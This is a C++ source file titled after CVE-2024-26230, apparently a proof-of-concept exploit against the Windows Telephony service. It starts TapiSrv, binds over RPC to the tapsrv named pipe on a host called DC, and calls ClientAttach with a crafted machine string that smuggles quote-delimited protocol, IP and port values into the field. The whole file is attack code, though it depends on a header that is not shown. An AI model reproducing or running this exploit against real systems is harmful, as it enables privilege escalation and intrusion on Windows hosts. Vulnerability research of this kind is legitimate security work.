// CVE-2024-26230.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include "Header.h"
#pragma comment(lib, "Rpcrt4.lib")

int main()
{
    std::wstring tapisrv{ L"TapiSrv" };

    ServiceHelper tapiservice { tapisrv , SERVICE_START};
    tapiservice.StartTheDamnService();
    //tapiservice.StopTheDamnService();
    PCONTEXT_HANDLE_TYPE TapiSrvContext = nullptr;
    std::wstring pszDomainUser{ L"" };
    TCHAR  infoBuf[1024] = { '\0' };
    DWORD nSize = 1024;
    std::wstring hostName{ 0 };
    GetComputerNameW(infoBuf, &nSize);
    std::wstring currentMachine = infoBuf;
    LONG output = 0;
    LONG phAsyncEventsEvent = 0;
    RPC_STATUS rpcStatus;
    RPC_WSTR szStringBinding = NULL;
    RPC_WSTR pszProtSeq = (RPC_WSTR)L"ncacn_np";
    RPC_WSTR pszTCPPort = (RPC_WSTR)L"\\pipe\\tapsrv";
    RPC_WSTR pszTCPHost = (RPC_WSTR)L"DC";
    rpcStatus = RpcStringBindingCompose(
        NULL,           // UUID to bind to.
        pszProtSeq,		// Use TCP/IP protocol.
        pszTCPHost,		// TCP/IP network address to use.
        pszTCPPort,     // TCP/IP port to use.
        NULL,           // Protocol dependent network options to use.
        &szStringBinding);	// String binding output.
    std::wcout << "The szStringBinding: " << (wchar_t*)szStringBinding << std::endl;
    // Create a valid binding handle from String
    std::wstring pszMachine { L"10.4.99.1\"ncacn_ip_tcp\"8081\"ncacn_ip_tcp\"8080\"" };
    rpcStatus = RpcBindingFromStringBinding(
        szStringBinding,	// The string binding to validate.
        &tapsrvImplicitHandle	// Put the result in the  binding
    );						// handle defined in the IDL file.

    if (rpcStatus != RPC_S_OK) {
        wprintf(L"[-] RpcBindingFromStringBinding() failed with status: %d.\n", rpcStatus);
        exit(rpcStatus);
    }
    std::wcout << "pszMachine : " << pszMachine.c_str() << std::endl;
    RpcBindingSetAuthInfo(tapsrvImplicitHandle, NULL, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_AUTHN_DEFAULT, NULL, RPC_C_AUTHN_DEFAULT);

    NTSTATUS status;
    
    status = ClientAttach(&TapiSrvContext, -1, &phAsyncEventsEvent, const_cast<wchar_t*>(pszDomainUser.c_str()), const_cast<wchar_t*>(pszMachine.c_str()));
    std::cout << status << std::endl;
}


void __RPC_FAR* __RPC_USER midl_user_allocate(size_t cBytes)
{
    return((void __RPC_FAR*) malloc(cBytes));
}
void __RPC_USER midl_user_free(void __RPC_FAR* ptr)
{
 
    free(ptr);
}